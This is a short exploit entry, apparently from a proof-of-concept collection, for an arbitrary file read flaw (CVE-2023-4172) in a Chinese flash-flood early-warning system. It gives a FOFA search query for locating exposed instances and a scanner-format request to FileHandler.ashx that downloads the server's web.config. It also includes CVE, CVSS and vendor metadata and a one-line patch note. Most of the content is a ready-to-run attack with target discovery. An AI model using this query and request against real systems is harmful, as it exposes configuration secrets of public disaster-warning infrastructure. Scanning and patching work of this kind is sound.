# 成都万江港利科技有限公司 万江港利-山洪灾害预警系统 FileHandler.ashx 任意文件读取

    ## fofa

```
body="万江港利"&&body="山洪灾害"
```



## exp

```
detail:
  ID: 4849
  Author: Peanut
  Name: 万江港利-山洪灾害预警系统 任意文件读取漏洞(CVE-2023-4172)
  Description: 万江港利山洪灾害防治预警系统软件是对空间信息技术、计算机网络技术、现代通信技术进行无缝集成，结合灾害监测预警的业务需求，采用世界领先GIS地理信息处理技术、RS遥感技术、GPRS/CMDA/3G通讯技术、Microsoft
    Silverlight Web前端应用程式开发解决方案、以及大容量数据采集技术和大容量数据存储等计算机网络通信与数据处理技术，建立一个用户界面友好的、多终端的、可定制的、集数据采集、存储、分析于一体的综合地理信息平台。该系统存在任意文件读取漏洞，攻击者可获取大量敏感信息
  Identifier:
    CVE: CVE-2023-4172
    DVB: DVB-2023-4849
  Cvss:
    Score: 4.3
    Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
  VulnClass:
  - 任意文件读取
  Category:
  - 应用服务
  Manufacturer: '成都万江港利科技有限公司 '
  Product: 万江港利-山洪灾害预警系统
  Type: 1
  Status: 1
  Scanable: 1
  Level: 3
  DisclosureDate: '2023-08-05'
  Is0day: false
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: body="万江港利"&&body="山洪灾害"
  Solutions:
  - 请关注厂商的修复版本，并及时更新到最新版本.
poc:
  relative: req0
  session: true
  requests:
  - method: GET
    timeout: 10
    path: /Service/FileHandler.ashx?Action=Download&FileDirectory=E:/SCWJ/Official/Web/MFCW/&FileName=web.config&FileSourceName=web
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/57.0.927.108 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("<configuration>") && body.contains("<authorization>"))

```
